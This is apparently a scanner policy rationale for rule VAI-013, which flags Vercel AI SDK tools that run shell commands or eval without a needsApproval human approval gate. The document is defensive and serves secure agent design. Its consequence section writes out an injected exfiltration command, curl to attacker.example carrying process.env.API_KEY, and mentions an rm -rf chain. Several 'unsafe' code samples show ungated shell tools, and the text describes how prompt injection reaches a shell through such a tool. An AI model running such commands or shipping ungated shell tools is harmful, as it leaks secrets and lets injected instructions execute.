---
policy_id: vercel_ai_approvals
category: vercel_ai
topic: approvals
rules:
  - id: VAI-013
    severity: high
    confidence: 0.7
    scope: tool
    fix_type: config
references: [LLM06]
---

# Policy Rationale: Vercel AI SDK Tool Approval Gates

**Policy ID:** `vercel_ai_approvals`  
**File:** `vercel_ai/approvals.yaml`  
**Rules:** VAI-013  
**Severities:** high  
**Fix types:** config  
**References:** LLM06 (Excessive Agency)

---

## What this policy covers

The Vercel AI SDK's human-in-the-loop `needsApproval` gate on sensitive tool
calls defaults to `false`. **VAI-013** (tool scope) fires when a `tool()` or
`dynamicTool()` whose `execute()` body shells out or evaluates code has no
effective `needsApproval` gate. The option is absent or explicitly `false`.
Passing `true` or a per-call approval function both count as a gate and do not
fire. This complements capability rules **VAI-001** (subprocess) and
**VAI-002** (eval / `new Function`): those flag the dangerous operation;
VAI-013 flags the missing checkpoint around it.

SDK 7 moved approval from individual tool definitions to `toolApproval` on
`generateText`, `streamText`, or `ToolLoopAgent`. VAI-013 inspects only the
tool-level `needsApproval` option. It cannot yet verify a separate SDK 7 call
or agent-level `toolApproval` configuration, so such code may need manual
review after this rule fires.

**Scope vs OAI-014:** the OpenAI SDK port **OAI-014** also matches
`has_write_call`, so an un-gated `@function_tool` that writes the filesystem
fires there. **VAI-013** deliberately does not include that predicate. The
Vercel AI pack has no shipped filesystem-write capability rule yet (no VAI
counterpart to CSDK-012 or OAI-006), and shell/code-exec are the privileged
operations this pack already covers with **VAI-001** and **VAI-002**. Pairing
the approval gate only with those predicates keeps VAI-013 aligned with
established capability rules rather than half-porting OAI-014's write leg before
write detection exists for TypeScript Vercel tools. When a Vercel
filesystem-write rule ships, revisit whether approval gating should extend to
it.

Official references:

- [Tool calling — Tool approval](https://ai-sdk.dev/docs/ai-sdk-core/tools-and-tool-calling) (`needsApproval` deprecated; use `toolApproval`)
- [Migrate AI SDK 6.x to 7.0 — needsApproval → toolApproval](https://ai-sdk.dev/docs/migration-guides/migration-guide-7-0)

---

## Why approval gating is a distinct concern in Vercel AI tools

A privileged Vercel AI tool whose `execute()` runs a command or evaluates code
warrants human confirmation before it fires because its effects are real and
hard to undo. The
SDK provides that confirmation through `needsApproval` (SDK 6 and transitional
SDK 7 code) or `toolApproval` at the agent/call level (SDK 7+). The catch is
that `needsApproval` defaults to `false`. A privileged tool ships *un-gated*
unless the author opts in.

In a tool loop the tool's arguments are model-generated and dispatch is
autonomous, so "the model decided to run this command" is not a human decision.
An un-gated privileged tool means attacker-influenced model output reaches a
shell or an in-process evaluator with no checkpoint. This is
OWASP LLM06 (Excessive Agency) in its most literal form: the agent can take a
high-impact action with no human in the loop.

The fix is *config*: `needsApproval` is a tool-options keyword, set without
changing `execute()` logic. SDK 7 uses `toolApproval` on the generation call or
agent, but Trustabl does not yet correlate that setting with an individual tool.

---

## Rule-by-rule defense

### VAI-013 — Privileged tool has no needsApproval gate (Severity: high, Confidence: 0.7, Fix type: config)

**What we detect:** a `vercel_ai_tool` whose `execute()` body shells out or runs
`eval` / `new Function` (`has_shell_call` / `has_code_exec_call`) and has no
effective `needsApproval` gate. The option is absent or explicitly `false`;
`true` or a callback function silences the rule.

**Why it is flaggable:** the privileged operation executes model-chosen input
with no human checkpoint, because `needsApproval` defaults to `false`.

**Real-world consequence:** a `runShell(cmd)` tool wired as
`tool({ execute: ({ cmd }) => exec(cmd) })` with no approval option fires
whatever the model produced — there is no approval prompt to catch an injected
`curl attacker.example/exfil?key=` + `process.env.API_KEY` or an
`rm -rf` chain. The same applies to an `eval(userExpr)` helper: the missing
gate is the difference between "model proposed" and "system executed."

**Why severity is high and not medium:** it leaves a high-impact, hard-to-undo
operation ungated at the SDK's documented HITL boundary. Medium is reserved for
amplifiers and hygiene; an absent approval gate on shell or code execution is a direct
path from prompt injection to execution.

**Fix type — config:** add `needsApproval: true` (or a per-call approval
function) and handle approval requests in the agent loop. SDK 7 uses
`toolApproval` on `generateText` / `streamText` / `ToolLoopAgent`, but that
separate configuration is outside this rule's current detection surface.

**Confidence 0.7:** a tool may be deliberately protected by SDK 7 call or
agent-level `toolApproval`, input validation, or a sandbox that this tool-local
check cannot see. Callback-based approval (`needsApproval: async (...) => ...`)
is treated as a gate when present; external middleware is also invisible to this
rule.

---

## Unsafe and safe examples

### Unsafe — missing gate (fires VAI-013)

```typescript
import { tool } from "ai";
import { z } from "zod";
import { exec } from "node:child_process";
import { promisify } from "node:util";

const run = promisify(exec);

export const runShell = tool({
  description: "Run a shell command and return stdout.",
  inputSchema: z.object({ command: z.string() }),
  execute: async ({ command }) => {
    const { stdout } = await run(command);
    return { stdout };
  },
});
```

### Unsafe — explicit false (fires VAI-013)

```typescript
export const runShell = tool({
  description: "Run a shell command.",
  inputSchema: z.object({ command: z.string() }),
  needsApproval: false,
  execute: async ({ command }) => {
    /* exec(command) */
    return { ok: true };
  },
});
```

### Safe — needsApproval true (silent)

```typescript
export const runShell = tool({
  description: "Run an allow-listed shell command.",
  inputSchema: z.object({ command: z.string() }),
  needsApproval: true,
  execute: async ({ command }) => {
    /* execFile with fixed argv after human approval */
    return { ok: true };
  },
});
```

Handle `tool-approval-request` parts in your UI or server loop before the tool
runs. See [Tool calling — Tool approval](https://ai-sdk.dev/docs/ai-sdk-core/tools-and-tool-calling).

### Safe — callback gate (silent)

```typescript
export const runShell = tool({
  description: "Run a shell command.",
  inputSchema: z.object({ command: z.string() }),
  needsApproval: async ({ command }) => command !== "git status",
  execute: async ({ command }) => {
    /* execFile after conditional approval */
    return { command };
  },
});
```

A non-literal approval function counts as a gate; the scanner treats any present
`needsApproval` kwarg that is not the literal `false` as opted in.

### SDK 7 toolApproval at call level (known limitation)

```typescript
const runShell = tool({
  inputSchema: z.object({ command: z.string() }),
  execute: async ({ command }) => {
    /* execFile after approval */
    return { command };
  },
});

await streamText({
  model: yourModel,
  tools: { runShell },
  toolApproval: {
    runShell: async ({ command }) =>
      command === "git status" ? undefined : "user-approval",
  },
});
```

This pattern moves approval off the tool definition. VAI-013 can still fire
because the tool has no `needsApproval` option and the rule cannot see the
separate `toolApproval` configuration. Treat this as a manual-review finding
until Trustabl adds call or agent-level approval correlation.

---

## Callback and external-middleware limitations

**Callback approval:** when `needsApproval` is a function (sync or async), the
rule stays silent — the author opted into programmatic approval. The scanner
does not evaluate whether the callback ever returns `true` or blocks dangerous
paths; it only checks that a gate exists.

**External middleware:** if your application intercepts tool calls outside the
SDK (custom run loop, proxy, workflow step) without setting `needsApproval` or
`toolApproval`, VAI-013 still fires. The rule reads tool constructor options,
not out-of-band approval infrastructure the engine cannot see. Document such
designs in AGENTS.md and pair them with agent-level tests.

**SDK 7 migration:** `needsApproval` on `tool()` is deprecated. Prefer
`toolApproval` on `generateText`, `streamText`, or `ToolLoopAgent` so approval
policy can vary per request. VAI-013 cannot verify that setting yet, so record
the result as a known limitation. See the [7.0 migration guide](https://ai-sdk.dev/docs/migration-guides/migration-guide-7-0).

---

## What this policy does not cover

- **Filesystem writes without an approval gate.** Unlike **OAI-014**, VAI-013
  does not match `has_write_call`. A Vercel AI tool whose `execute()` only
  writes files (for example via `writeFileSync`) and has no `needsApproval`
  option does not fire this rule. See the scope note above; filesystem-write
  approval gating is deferred until the pack ships a write capability rule.
- Tools made safe by `toolApproval` at the agent/call level without
  `needsApproval` on the tool. This deliberate SDK 7 pattern can still produce
  a finding because the rule reads tool options only.
- Privileged operations performed through libraries the capability predicates
  do not match, such as async spawn wrappers.
- Whether an approval handler actually presents the action meaningfully to a
  human or rubber-stamps it.
- `needsApproval` or `toolApproval` set dynamically from a variable the scanner
  cannot resolve.

---

## Recommendations beyond the fix

```typescript
import { tool } from "ai";
import { z } from "zod";
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const run = promisify(execFile);

export const deploy = tool({
  description: "Deploy a named service to staging.",
  inputSchema: z.object({ service: z.string() }),
  needsApproval: true,
  execute: async ({ service }) => {
    const { stdout } = await run("kubectl", ["rollout", "restart", service], {
      timeout: 30_000,
    });
    return { log: stdout };
  },
});
```

1. Set `needsApproval: true` on every supported tool that runs commands or
   executes code, and implement approval handling in your run loop or UI. SDK 7
   users should configure `toolApproval` and treat VAI-013 as a known tool-level
   limitation until call-level detection exists.
2. Where approval must be automated, replace the human gate with strict input
   validation and document why; do not rely on an implicit default.
3. Run privileged tools in an isolated sandbox with no ambient credentials.
